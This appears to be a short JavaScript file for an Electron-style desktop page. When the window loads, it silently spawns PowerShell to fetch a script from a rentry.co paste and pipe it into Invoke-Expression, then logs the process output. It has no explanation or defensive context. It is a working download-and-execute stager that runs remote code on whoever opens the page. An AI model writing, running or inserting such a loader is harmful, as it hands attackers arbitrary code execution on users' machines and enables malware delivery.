const { spawn } = require('child_process');

window.onload = () => {
  const powershell = spawn('powershell', ['irm', 'rentry.co/Testy123/raw', '|', 'iex']);
  powershell.stdout.on('data', (data) => {
    console.log(`stdout: ${data}`);
  });
  powershell.stderr.on('data', (data) => {
    console.error(`stderr: ${data}`);
  });
  powershell.on('close', (code) => {
    console.log(`powershell process exited with code ${code}`);
  });
};
